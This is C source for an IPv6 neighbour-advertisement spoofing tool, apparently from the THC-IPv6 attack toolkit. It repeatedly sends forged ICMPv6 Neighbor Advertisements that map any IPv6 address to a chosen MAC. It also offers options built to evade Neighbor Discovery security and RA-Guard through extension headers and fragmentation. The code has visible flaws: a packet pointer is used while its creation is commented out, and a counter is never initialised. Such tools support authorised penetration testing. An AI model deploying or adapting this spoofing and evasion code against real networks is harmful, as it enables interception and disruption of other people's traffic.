#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s [-DHF] [-Ors] [-n count] [-w seconds] interface "
      "ip-address-advertised [target-address [mac-address-advertised "
      "[source-ip-address]]]\n\n",
      prg);
  printf(
      "Advertise IPv6 address on the network (with own mac if not "
      "specified),\n");
  printf(
      "sending it to the all-nodes multicast address if no target address is "
      "set.\n");
  printf("Source ip address is the address advertised if not set.\n\n");
  printf("Sending options:\n");
  printf("  -n count    send how many packets (default: forever)\n");
  printf("  -w seconds  wait time between the packets sent (default: 5)\n");
  printf(
      "  -m srcmac   the srcmac address to send from (not what is "
      "advertised!\n");
  printf("Flag options:\n");
  printf("  -O  do NOT set the override flag (default: on)\n");
  printf("  -r  DO set the router flag (default: off)\n");
  printf("  -s  DO set the solicitate flag (default: off)\n");
  printf("ND Security evasion options (can be combined):\n");
  printf("  -F  full evasion attack (no other evasion options allowed)\n");
  printf("  -H  add a hop-by-hop header\n");
  printf(
      "  -f  add a one shot fragment header (can be specified multiple "
      "times)\n");
  printf("  -D  add a large destination header which fragments the packet.\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt1 = NULL, *pkt2 = NULL, buf[24], buf2[6], buf3[1500];
  unsigned char *unicast6, *src6 = NULL, *dst6 = NULL, srcmac[8] = "",
                           replymac[8] = "", *mac = replymac, *smac = NULL;
  int pkt1_len = 0, pkt2_len = 0, prefer = PREFER_GLOBAL, i, do_hop = 0,
      do_dst = 0, do_frag = 0, cnt, type = NXT_ICMP6, wait = 5, loop = -1,
      do_full = 0;
  unsigned int  flags = ICMP6_NEIGHBORADV_OVERRIDE;
  char *        interface;
  int           offset = 14;
  thc_ipv6_hdr *hdr;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (getenv("THC_IPV6_PPPOE") != NULL || getenv("THC_IPV6_6IN4") != NULL)
    printf("WARNING: %s is not working with injection!\n", argv[0]);

  while ((i = getopt(argc, argv, "DfFHOrsn:w:m:")) >= 0) {
    switch (i) {
      case 'n':
        loop = atoi(optarg);
        break;
      case 'w':
        wait = atoi(optarg);
        break;
      case 'm':
        sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *)&srcmac[0],
               (unsigned int *)&srcmac[1], (unsigned int *)&srcmac[2],
               (unsigned int *)&srcmac[3], (unsigned int *)&srcmac[4],
               (unsigned int *)&srcmac[5]);
        smac = srcmac;
        break;
      case 'O':
        if ((flags & ICMP6_NEIGHBORADV_OVERRIDE) > 0)
          flags -= ICMP6_NEIGHBORADV_OVERRIDE;
        break;
      case 'r':
        flags = (flags | ICMP6_NEIGHBORADV_ROUTER);
        break;
      case 's':
        flags = (flags | ICMP6_NEIGHBORADV_SOLICIT);
        break;
      case 'f':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'F':
        do_full = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (do_full) do_hop = do_dst = do_frag = 0;

  if (argc - optind < 2) help(argv[0]);

  if (do_hdr_size) offset = do_hdr_size;

  interface = argv[optind];
  if (thc_get_own_mac(interface) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  if ((unicast6 = thc_resolve6(argv[optind + 1])) == NULL) {
    fprintf(stderr, "Error: %s does not resolve to a valid IPv6 address\n",
            argv[optind + 1]);
    exit(-1);
  }
  if (argc - optind >= 3 && argv[optind + 2] != NULL)
    dst6 = thc_resolve6(argv[optind + 2]);
  else
    dst6 = thc_resolve6("ff02::1");
  if (dst6 == NULL) {
    fprintf(stderr, "Error: could not resolve destination of advertise: %s\n",
            argv[optind + 2]);
    exit(-1);
  }
  if (argc - optind >= 4 && argv[optind + 3] != NULL)
    sscanf(argv[optind + 3], "%x:%x:%x:%x:%x:%x", (unsigned int *)&replymac[0],
           (unsigned int *)&replymac[1], (unsigned int *)&replymac[2],
           (unsigned int *)&replymac[3], (unsigned int *)&replymac[4],
           (unsigned int *)&replymac[5]);
  else
    mac = thc_get_own_mac(interface);

  if (smac == NULL) smac = mac;

  if (argc - optind >= 5 && argv[optind + 4] != NULL)
    src6 = thc_resolve6(argv[optind + 4]);
  else
    src6 = unicast6;

  memset(buf, 0, sizeof(buf));
  memcpy(buf, unicast6, 16);
  buf[16] = 2;
  buf[17] = 1;
  memcpy(&buf[18], mac, 6);
  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));

  if ((pkt1 = thc_create_ipv6_extended(interface, prefer, &pkt1_len, src6, dst6,
                                       0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (do_hop) {
    type = NXT_HBH;
    if (thc_add_hdr_hopbyhop(pkt1, &pkt1_len, buf2, sizeof(buf2)) < 0)
      return -1;
  }
  if (do_frag) {
    if (type == NXT_ICMP6) type = NXT_FRAG;
    for (i = 0; i <= do_frag; i++)
      if (thc_add_hdr_oneshotfragment(pkt1, &pkt1_len, cnt++) < 0) return -1;
  }
  if (do_dst) {
    if (type == NXT_ICMP6) type = NXT_DST;
    if (thc_add_hdr_dst(pkt1, &pkt1_len, buf3, sizeof(buf3)) < 0) return -1;
  }
  if (thc_add_icmp6(pkt1, &pkt1_len, ICMP6_NEIGHBORADV, 0, flags,
                    (unsigned char *)&buf, 24, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, smac, NULL, pkt1, &pkt1_len) < 0) {
    fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
    exit(-1);
  }
  /*
    if ((pkt2 = thc_create_ipv6_extended(interface, prefer, &pkt2_len, src6,
    dst6, 0, 0, 0, 0, 0)) == NULL) return -1; if (do_hop) if
    (thc_add_hdr_hopbyhop(pkt2, &pkt2_len, buf2, sizeof(buf2)) < 0) return -1;
    if (do_frag)
      for (i = 0; i <= do_frag; i++)
        if (thc_add_hdr_oneshotfragment(pkt2, &pkt2_len, cnt++) < 0)
          return -1;
    if (do_dst)
      if (thc_add_hdr_hopbyhop(pkt2, &pkt2_len, buf3, sizeof(buf3)) < 0)
        return -1;
    if (thc_add_icmp6(pkt2, &pkt2_len, ICMP6_NEIGHBORADV, 0, 0, (unsigned char
    *) &buf, 24, 0) < 0) return -1; if (thc_generate_pkt(interface, smac, NULL,
    pkt2, &pkt2_len) < 0) { fprintf(stderr, "Error: Can not generate packet,
    exiting ...\n"); exit(-1);
    }
  */
  printf("Starting advertisement of %s (Press Control-C to end)\n",
         argv[optind + 1]);
  while (loop) {
    if (do_full) {
      hdr = (thc_ipv6_hdr *)pkt1;
      thc_send_raguard_bypass6(interface, src6, dst6, smac, NULL, NXT_ICMP6,
                               hdr->pkt + 40 + offset,
                               hdr->pkt_len - 40 - offset, 0);
    } else if (do_dst) {
      hdr = (thc_ipv6_hdr *)pkt1;
      thc_send_as_fragment6(interface, src6, dst6, type, hdr->pkt + 40 + offset,
                            hdr->pkt_len - 40 - offset, 1240);
      hdr = (thc_ipv6_hdr *)pkt2;
      thc_send_as_fragment6(interface, src6, dst6, type, hdr->pkt + 40 + offset,
                            hdr->pkt_len - 40 - offset, 1240);
    } else {
      thc_send_pkt(interface, pkt1, &pkt1_len);
      //      thc_send_pkt(interface, pkt2, &pkt2_len);
    }
    if (loop != -1) loop--;
    if (loop) sleep(wait);
  }

  return 0;
}
